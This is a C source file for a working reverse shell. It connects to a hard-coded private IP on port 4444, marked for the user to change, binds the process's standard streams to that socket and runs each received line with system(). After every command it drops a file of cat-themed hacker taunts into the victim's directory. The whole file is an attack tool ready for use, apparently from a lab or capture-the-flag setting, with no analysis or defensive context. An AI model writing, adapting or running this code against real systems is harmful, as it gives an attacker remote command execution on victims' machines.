#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

void drop_random_cat_file(void) {
    const char *payloads[] = {
        "  /\\_/\\\n ( o.o )\n  > ^ <",
        "Cat fact: \nCats sleep 12-16 hours/day.\nBut they meow meow meow meow meow",
        "soft paws in moonlight Meow\nsilent whiskers test the air Meow",
        "Freaky Kitty Sees you Meow",
        "Meow Me0w Cats can Hack too",
        "$cr1ptK1tt13$ was here MEow",
        "Meow MEow Meow me0w mow!",
        "Preaching to the MEOW MEOW!\nCan i Get the Meow a little MEOW MEOW!",
        "La $K1Dshell"
    };
    size_t n_payloads = sizeof(payloads)/sizeof(payloads[0]);

    char filename[256];
    time_t now = time(NULL);
    int r = rand() % 1000000;
    snprintf(filename, sizeof(filename), "cat_%ld_%06d.txt", (long)now, r);

    FILE *f = fopen(filename, "w");
    if (!f) return;
    fprintf(f, "%s\n", payloads[rand() % n_payloads]);
    fclose(f);
}

int main(void){
    int port = 4444; //change me
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.15.1"); //change me

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    srand(time(NULL) ^ getpid());

    char cmd[512];
    while (1) {
        memset(cmd, 0, sizeof(cmd));
        if (fgets(cmd, sizeof(cmd), stdin) == NULL) break;

        // remove newline
        cmd[strcspn(cmd, "\n")] = 0;

        if (strlen(cmd) == 0) continue;
        if (strcmp(cmd, "exit") == 0) break;

        system(cmd);          // run the command
        drop_random_cat_file(); // drop a cat file after every command
    }

    return 0;
}
